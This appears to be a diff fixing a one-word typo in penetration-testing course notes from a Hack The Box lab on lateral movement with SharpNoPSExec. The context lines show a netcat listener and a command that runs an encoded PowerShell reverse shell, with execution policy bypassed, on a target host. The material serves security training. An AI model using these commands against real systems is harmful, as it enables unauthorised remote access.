@@ -457,7 +457,7 @@ d41y@htb[/htb]$ nc -lnvp 8080
 Listening on 0.0.0.0 8080
 ```
 
-SharpNoPSExec uses the credentials of the console you are executing the command from, so you need to make sure to launch it from a console that has the correct credentials. Alternatively, you can use the arguments `--username`, `--password` and `--domain`. Additionally, you have to provide the target IP address or the domain name `--target=<IP/DOMAIN>`, and the ommand you want to execute. For the command, you can use the payload in the help menu to set your reverse shell `--payload="c:\windows\system32\cmd.exe /c <reverseShell>`.
+SharpNoPSExec uses the credentials of the console you are executing the command from, so you need to make sure to launch it from a console that has the correct credentials. Alternatively, you can use the arguments `--username`, `--password` and `--domain`. Additionally, you have to provide the target IP address or the domain name `--target=<IP/DOMAIN>`, and the command you want to execute. For the command, you can use the payload in the help menu to set your reverse shell `--payload="c:\windows\system32\cmd.exe /c <reverseShell>`.
 
 ```powershell
 PS C:\Tools> .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="
